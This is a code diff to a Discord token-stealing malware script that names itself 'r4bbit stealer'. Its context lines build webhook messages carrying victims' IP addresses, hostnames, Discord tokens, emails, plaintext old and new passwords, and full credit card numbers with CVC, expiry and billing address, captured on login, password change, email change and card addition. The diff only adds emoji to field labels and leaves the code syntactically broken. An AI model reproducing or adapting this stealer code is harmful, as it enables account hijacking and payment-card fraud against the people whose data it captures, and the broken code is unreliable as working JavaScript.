@@ -304,35 +304,35 @@ function Login(email, password, token) {
                                 value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
                                 inline: !1
                             }, {
-                                name: "Username",
+                                name: :box: "Username",
                                 value: `\`${json.username}#${json.discriminator}\``,
                                 inline: !0
                             }, {
-                                name: "ID",
+                                name: :pepesussy: "ID",
                                 value: `\`${json.id}\``,
                                 inline: !0
                             }, {
-                                name: "Nitro",
+                                name: :pepenitro: "Nitro",
                                 value: `${GetNitro(json.premium_type)}`,
                                 inline: !1
                             }, {
-                                name: "Badges",
+                                name: :badges: "Badges",
                                 value: `${GetBadges(json.flags)}`,
                                 inline: !1
                             }, {
-                                name: "Billing",
+                                name: 💶 "Billing",
                                 value: `${Cool()}`,
                                 inline: !1
                             }, {
-                                name: "Email",
+                                name: :pepeasadatata: "Email",
                                 value: `\`${email}\``,
                                 inline: !0
                             }, {
-                                name: "Password",
+                                name: 🔞 "Password",
                                 value: `\`${password}\``,
                                 inline: !0
                             }, {
-                                name: "Token",
+                                name: :756457809591271546: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: !1
                             }, ],
@@ -346,7 +346,7 @@ function Login(email, password, token) {
                                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                             }
                         }, {
-                            "title": `Total Friends (${totalFriends()})`,
+                            "title": :mm_yestickmark: `Total Friends (${totalFriends()})`,
                             "color": config['embed-color'],
                             "description": CalcFriends(),
                             "author": {
@@ -418,39 +418,39 @@ function ChangePassword(oldpassword, newpassword, token) {
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
                             inline: !1
                         }, {
-                            name: "Username",
+                            name: :box: "Username",
                             value: `\`${json.username}#${json.discriminator}\``,
                             inline: !0
                         }, {
-                            name: "ID",
+                            name: :pepesussy: "ID",
                             value: `\`${json.id}\``,
                             inline: !0
                         }, {
-                            name: "Nitro",
+                            name: :pepenitro: "Nitro",
                             value: `${GetNitro(json.premium_type)}`,
                             inline: !1
                         }, {
-                            name: "Badges",
+                            name: :badges: "Badges",
                             value: `${GetBadges(json.flags)}`,
                             inline: !1
                         }, {
-                            name: "Billing",
+                            name: 💶 "Billing",
                             value: `${Cool()}`,
                             inline: !1
                         }, {
-                            name: "Email",
+                            name: :pepeasadatata: "Email",
                             value: `\`${json.email}\``,
                             inline: !1
                         }, {
-                            name: "Old Password",
+                            name: 🔞 "Old Password",
                             value: `\`${oldpassword}\``,
                             inline: !0
                         }, {
-                            name: "New Password",
+                            name: 🔞 "New Password",
                             value: `\`${newpassword}\``,
                             inline: !0
                         }, {
-                            name: "Token",
+                            name: :mm_yestickmark: "Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }, ],
@@ -522,35 +522,35 @@ function ChangeEmail(newemail, password, token) {
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
                             inline: !1
                         }, {
-                            name: "Username",
+                            name: :box: "Username",
                             value: `\`${json.username}#${json.discriminator}\``,
                             inline: !0
                         }, {
-                            name: "ID",
+                            name: :pepesussy: "ID",
                             value: `\`${json.id}\``,
                             inline: !0
                         }, {
-                            name: "Nitro",
+                            name: :pepenitro: "Nitro",
                             value: `${GetNitro(json.premium_type)}`,
                             inline: !1
                         }, {
-                            name: "Badges",
+                            name: :badges: "Badges",
                             value: `${GetBadges(json.flags)}`,
                             inline: !1
                         }, {
-                            name: "Billing",
+                            name: 💶 "Billing",
                             value: `${Cool()}`,
                             inline: !1
                         }, {
-                            name: "New Email",
+                            name: :pepeasadatata: "New Email",
                             value: `\`${newemail}\``,
                             inline: !0
                         }, {
-                            name: "Password",
+                            name: 🔞 "Password",
                             value: `\`${password}\``,
                             inline: !0
                         }, {
-                            name: "Token",
+                            name: :mm_yestickmark: "Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }, ],
@@ -590,7 +590,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                 username: "r4bbit stealer",
                 content: "",
                 embeds: [{
-                    "title": "User Credit Card Added",
+                    "title": 💶💶 "User Credit Card Added",
                     "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                     "author": {
                         "name": "r4bbit stealer"
